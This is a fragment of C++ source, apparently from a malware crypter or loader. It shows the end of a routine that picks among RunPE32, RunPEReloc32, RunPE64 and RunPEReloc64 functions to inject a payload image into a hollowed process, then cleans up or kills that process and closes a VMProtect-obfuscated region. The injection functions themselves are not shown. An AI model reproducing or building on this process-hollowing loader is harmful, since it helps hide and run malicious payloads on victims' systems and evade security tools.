 CleanAndExitProcess(&PI, nullptr);
 continue;
 }

 if (bSource32 && !HasRelocation32(hFileContent)) success = RunPE32(&PI, hFileContent);
 else if (bSource32 && HasRelocation32(hFileContent)) success = RunPEReloc32(&PI, hFileContent);
 else if (!bSource32 && !HasRelocation64(hFileContent)) success = RunPE64(&PI, hFileContent);
 else if (!bSource32 && HasRelocation64(hFileContent)) success = RunPEReloc64(&PI, hFileContent);

 if (success) {
 CleanProcess(&PI, nullptr);
 break;
 }
 CleanAndExitProcess(&PI, nullptr);
 }

 HeapFree(GetProcessHeap(), 0, hFileContent);
 VMProtectEnd();
 return success ? 0 : -1;
}